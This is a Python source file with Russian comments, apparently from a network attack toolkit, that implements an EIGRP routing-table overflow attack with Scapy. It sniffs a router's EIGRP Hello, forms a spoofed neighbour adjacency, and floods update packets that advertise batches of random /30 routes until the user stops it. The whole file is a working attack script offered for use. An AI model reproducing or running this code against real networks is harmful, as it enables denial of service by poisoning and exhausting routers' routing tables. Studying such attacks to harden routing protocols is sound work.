from scapy.all import *
from scapy.contrib.eigrp import EIGRP, EIGRPParam, EIGRPIntRoute, EIGRPSwVer, EIGRPAuthData
from colorama import *
from threading import Thread


def eigrp_rto(interface):
    try:
        print(Fore.YELLOW + f"    [!] Listening for EIGRP routers... Please wait...")  # Переведено
        global eigrp_hello_captured
        eigrp_hello_captured = False  # Не захвачен

        def analyze_packet(packet):
            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time, auth, eigrp_hello_captured
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 5:  # Если это EIGRP Hello
                if packet.haslayer(EIGRPAuthData):
                    auth = True
                    auth_type = packet[EIGRPAuthData].authtype
                    auth_data = packet[EIGRPAuthData].authdata
                    key_id = packet[EIGRPAuthData].keyid
                    if auth_type == 2:
                        output_auth = f" {Fore.RED}MD5 (Temporarily unsupported){Fore.RESET}"
                    elif auth_type == 3:
                        output_auth = f" {Fore.RED}SHA2-256 (Temporarily unsupported){Fore.RESET}"
                else:
                    auth = False
                    output_auth = "None"
                    eigrp_hello_captured = True  # Захвачен

                target_mac = (packet[Ether].src).upper()
                target_ip = packet[IP].src
                autonomous_system = packet[EIGRP].asn
                k1 = packet[EIGRPParam].k1
                k2 = packet[EIGRPParam].k2
                k3 = packet[EIGRPParam].k3
                k4 = packet[EIGRPParam].k4
                k5 = packet[EIGRPParam].k5
                hold_time = packet[EIGRPParam].holdtime
                conf.checkIPaddr = False

                print(Fore.GREEN + f"\n    [+] [EIGRP router detected]")  # Переведено
                print(Fore.GREEN + f"         IP: {target_ip}")  # Переведено
                print(Fore.GREEN + f"         MAC: {target_mac}")  # Переведено
                print(Fore.GREEN + f"         Autonomous System: {autonomous_system}")  # Переведено
                print(Fore.GREEN + f"         K1: {k1}, K2: {k2}, K3: {k3}, K4: {k4}, K5: {k5}")  # Переведено
                print(Fore.GREEN + f"         Hold Time: {hold_time}")  # Переведено
                print(Fore.GREEN + f"         Authentication: {output_auth}")  # Переведено

        sniffer = AsyncSniffer(filter="ip proto 88", iface=interface, prn=analyze_packet, store=0, timeout=20, count=1)  # Ждем захвата EIGRP пакета и анализируем его
        sniffer.start()
        time.sleep(21)

        def send_eigrp_hello():  # Отправка EIGRP Hello соседнему роутеру каждые 5 сек
            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time
            try:
                while True:
                    hello_packet = (Ether(src="00:25:2e:01:ab:3c", dst="01:00:5e:00:00:0a") /
                                    IP(dst="224.0.0.10", ttl=1) /
                                    EIGRP(opcode=5, asn=autonomous_system) /
                                    EIGRPParam(holdtime=hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) /
                                    EIGRPSwVer())
                    sendp(hello_packet, iface=interface, verbose=False)
                    time.sleep(5)
            except KeyboardInterrupt:
                print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        def send_eigrp_ack():  # Отправка EIGRP Ack на обновления соседа
            try:
                def analyze_update(packet):
                    if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1 and packet[
                        Ether].src != "00:25:2e:01:ab:3c" or \
                            packet[EIGRP].opcode == 4:
                        seq_of_neighbor = packet[EIGRP].seq
                        target_mac = packet[Ether].src
                        target_ip = packet[IP].src
                        ack_for_update = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                                          IP(dst=target_ip, ttl=1) /
                                          EIGRP(opcode=5, asn=autonomous_system, ack=seq_of_neighbor))
                        sendp(ack_for_update, iface=interface, count=1, verbose=False)

                sniffer = AsyncSniffer(filter="ip proto 88", iface=interface, prn=analyze_update, store=0)
                sniffer.start()

            except KeyboardInterrupt:
                print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        def send_eigrp_update():  # Единичная отправка ложных маршрутов
            print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено
            time.sleep(1)
            total = 0
            seq = 100

            init_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) / IP(dst=target_ip, ttl=1) /
                           EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=1))
            sendp(init_packet, iface=interface, count=1,
                  verbose=False)  # Отправляем с флагом init только вначале при установлении соседства
            # иначе соседство будет сбрасываться, если с каждым обновлением будет идти флаг init
            seq += 1
            try:
                while True:
                    networks = [
                        ".".join(str(random.randint(1, 254)) for _ in range(3)) + "." + str(random.randrange(0, 253, 4))
                        for _ in range(16)
                    ]

                    prefix = 30
                    next_hop = "0.0.0.0"

                    # Создание базового пакета
                    update_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
                                     IP(dst=target_ip, ttl=1) /
                                     EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=8))

                    # Добавление маршрутов через цикл
                    for network in networks:
                        update_packet /= EIGRPIntRoute(nexthop=next_hop, dst=network, prefixlen=prefix)
                    sendp(update_packet, iface=interface, count=1, verbose=False)

                    seq += 1
                    total += 1
                    time.sleep(0.5)
                    print(Fore.GREEN + f"    [+] EIGRP Updates: {total} packets sent, ~{total * 16} routes advertised", end="\r")  # Переведено

            except KeyboardInterrupt:
                print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        if eigrp_hello_captured == False:  # Если не найден ни один EIGRP роутер
            print(Fore.RED + f"    [-] %ERROR: No EIGRP routers detected (attack aborted)")  # Переведено
        elif auth == True:  # Если есть аутентификация
            print(Fore.RED + f"\n    [-] %ERROR: EIGRP router uses authentication (attack aborted)")  # Переведено
        else:  # Если найден - запускаем Hello, Update и Ack процессы
            Thread(target=send_eigrp_hello, daemon=False).start()
            Thread(target=send_eigrp_ack, daemon=False).start()
            Thread(target=send_eigrp_update, daemon=False).start()

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено